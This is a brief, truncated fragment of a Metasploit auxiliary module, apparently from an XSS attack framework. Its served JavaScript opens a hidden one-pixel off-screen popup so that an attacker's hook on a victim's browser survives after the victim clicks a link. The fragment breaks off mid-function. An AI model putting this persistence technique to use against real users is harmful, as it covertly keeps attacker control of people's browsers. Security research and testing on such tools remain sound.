...
# Open a popup to keep conexion when victim click on a link
#
class Metasploit3 < Msf::Auxiliary
	...
	def on_request_uri(cli, req)
		code = %Q{
			function ghostinit(){
				var ghost = open(SERVER + "test.html", "XSSF_GHOST", "top=100000, left=100000, height=1, width=1, dialog=yes, dependent=yes, status=no");
				ghost.blur();
